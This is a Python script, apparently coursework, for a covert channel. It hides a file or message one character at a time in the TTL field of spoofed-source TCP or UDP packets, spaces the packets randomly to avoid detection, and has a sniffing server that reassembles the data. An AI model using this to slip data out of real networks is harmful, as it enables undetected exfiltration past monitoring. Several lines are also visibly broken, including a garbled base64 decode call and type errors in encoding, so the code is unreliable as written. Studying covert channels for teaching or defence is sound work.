#!/usr/bin/python3

import sys
import os
import argparse
import time
import base64
from scapy.all import *

"""
Program argument initialization 
./sneaky.py -s 192.168.0.4 -sport 80 -d 192.168.0.7 -dport 80 -f ./key.py -t TCP -mode client
sudo python3 sneaky.py -f ./server.py -t TCP -mode server
"""
arg_parser = argparse.ArgumentParser(
    prog='Covert Channel',
    description='COMP 8505 Assignment 1 by Peyman Tehrani Parsa'
)
arg_parser.add_argument('-s',dest='src_ip', help='IP of computer being bounced off of')
arg_parser.add_argument('-sport',dest='src_port', help='Port of computer being bounced off of', const=80, nargs='?')
arg_parser.add_argument('-d',dest='des_ip', help='IP of server')
arg_parser.add_argument('-dport',dest='des_port', help='Port of server', const=80, nargs='?')
arg_parser.add_argument('-f','-file',dest='file', help='File being sent')
arg_parser.add_argument('-msg',dest='msg', help='Text being sent')
arg_parser.add_argument('-b', help='If file being sent is binary')
arg_parser.add_argument('-t','-transport',dest='transport', help='TCP or UDP')
arg_parser.add_argument('-mode',dest='mode', help='server or client')
args = arg_parser.parse_args()

que_out=None
que_in=[]
packet_num=0

def client_input():
    """ Checks if the user has decided to send a file or a message """
    global que_out
    if args.file is not None:
        print('reading file')
        with open(args.file, 'rb') as f:
            que_out = f.read()
    elif args.msg is not None:
        que_out = base64.b64encode(args.msg)
    else:
        print('Select either file or message to send')
        exit()

def craft(character):
    """
    Packet crafting with scapy. The content being sent gets divided into characters and placed inside the TTL
    
    Keyword arguments:
    character -- Content being sent with the packet 

    Return:
    Packet object
    """
    global packet_num
    dport=int(args.des_port)
    sport=int(args.src_port)
    char = ord(character) #turn character into UTF8 equivalent 
    if args.transport == 'TCP':
        pck=IP(dst=args.des_ip, src=args.src_ip,ttl=char)/TCP(sport=sport,dport=dport,flags="SE")
    elif args.transport == 'UDP':
        pck=IP(dst=args.des_ip, src=args.src_ip,ttl=char)/UDP(sport=sport,dport=dport) 
    packet_num=1+packet_num #for testing
    return pck
    
def client():
    """
    For every character in message create packet and send
    """
    global que_out
    for char in que_out:
        pkt = craft(char)
        print(pkt)
        send(pkt)
        time.sleep(RandNum(1,4)*.1) #wait between sending packets to make detection harder

def parse_tcp(pkt: Packet):
    """
    Parse TCP packets for SE flags and store hidden information
    
    Keyword arguments:
    pkt -- Packet being read
    """
    flags=pkt['TCP'].flags
    if flags == 0x042:
        que_in.append(chr(pkt['IP'].ttl))
        x=base64.de''.join(que_in)
        print(x) #for testing purposes
        with open("key2.png","w+b") as f:
            f.seek(0)
            f.write(x)
        
def parse_udp(pck):
    return pck

def server():
    """
    If in server mode launches the packet
    """
    if args.transport == 'TCP':
        print('Detecting TCP packets')
        sniff(filter="tcp", prn=parse_tcp)
    elif args.transport == 'UDP':
        print('Detecting UDP packets')
        sniff(filter="udp", prn=parse_udp)


if args.mode == 'server':
    server()
elif args.mode == 'client':
    client_input()
    client()